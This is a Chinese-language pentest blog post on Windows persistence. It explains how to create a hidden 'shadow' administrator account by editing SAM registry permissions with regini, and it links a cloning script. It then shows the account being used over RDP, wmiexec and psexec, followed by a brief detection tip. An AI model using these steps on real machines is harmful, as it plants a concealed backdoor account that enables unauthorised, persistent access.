---
layout: post
title: Backdoor and persistence-Windows
date: 2020-01-31 23:30:00
tags: 域渗透 backdoor persistence
categories: hack  
author: PythonPig
---
* content
{:toc}

这里主要记录自己使用的一些Windows后门和权限维持的方法，主要来自网络，另外记录一些自己在使用过程中踩的坑，方法会持续更新。  

{:refdef: style="text-align: center;"}
![backdoor](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Backdoor%20and%20persistence-Windows/backdoor.png?raw=true)
{: refdef}   
图片来源于https://xz.aliyun.com/t/4842




### \#0x00 影子账户:
影子账户指的是用户名以$结尾，具有administrator权限，使用net user和控制面板看不到的账户。  
下面添加影子账户的方法不适用于DC(域控)，因为该方法的隐藏利用了本地帐号保存在注册表HKEY_LOCAL_MACHINE\SAM\SAM中的信息，但是域控不存在本地账户： 
```
There is no local account on dc(domain controller)

Please understand that when a Windows server is promoted to a domain controller, the server no longer uses the local account (Security Accounts Manager [SAM]) database during normal operations to store users and groups. When the promotion is complete, the new domain controller has a copy of the Active Directory database in which it stores users, groups, and computer accounts. The SAM database is present, but it is inaccessible when the server is running in Normal mode. The only time that the local SAM database is used is when you boot into Directory Services Restore mode or the Recovery Console.
 
If this new domain controller is the first domain controller in a new domain, the local SAM database that the new domain controller contained as a stand-alone server is migrated to the Active Directory database that is created during the promotion. All of the local user accounts that the local SAM database contained when it had been a stand-alone server are migrated from the local SAM database to the Active Directory database. In addition, any permissions that had been assigned to the local users, such as, NTFS permissions, are retained when the users are migrated to the Active Directory database.
 
```  
1、分配注册表权限  
 
因为默认情况下，只用nt authority\system可以编辑HKEY_LOCAL_MACHINE\SAM\SAM，因此需要给administrator分配权限，regini的使用可以查看使用帮助。  
regini up.ini    
up.ini的内容如下:  
```
HKEY_LOCAL_MACHINE\SAM [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4 [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\Administrator [1 17]
```

2、使用powershell脚本添加影子账户  
这里使用三好学生的脚本添加影子账户，[Windows-User-Clone](https://github.com/3gstudent/Windows-User-Clone)，这个脚本需要system权限，因为注册表的权限已经打开，这里修改下脚本，使脚本可以在administrator权限下运行，[修改后的脚本](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Backdoor%20and%20persistence-Windows/Windows-User-Clone.ps1)，添加的用户名和密码在文件的最后一行。  

3、添加成功后，恢复注册表权限  
regini down.ini  
down.ini的内容如下:  
```
HKEY_LOCAL_MACHINE\SAM [1 17]
HKEY_LOCAL_MACHINE\SAM\SAM [17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains [17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4 [17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [17]
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\Administrator [17]
```

4、添加帐号的使用  
RDP:直接使用，用户名就是就是添加的用户，如：username$  
wmi:wmiexec.py "username$"@10.100.100.100  
psexe:psexec.py "username$"@10.100.100.100  
使用wmi或psexe时若提示“第一次登录需要修改密码”，则使用RDP在登录时修改密码。  

5、防御  
针对隐藏帐户的利用，查看注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\即可。  
当然，默认管理员权限(administrator)无法查看，需要分配权限或是提升至Sytem权限，可打开注册表编辑器(regedit.exe)直接分配权限。    

### 参考
* [渗透技巧——Windows系统的帐户隐藏](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/)
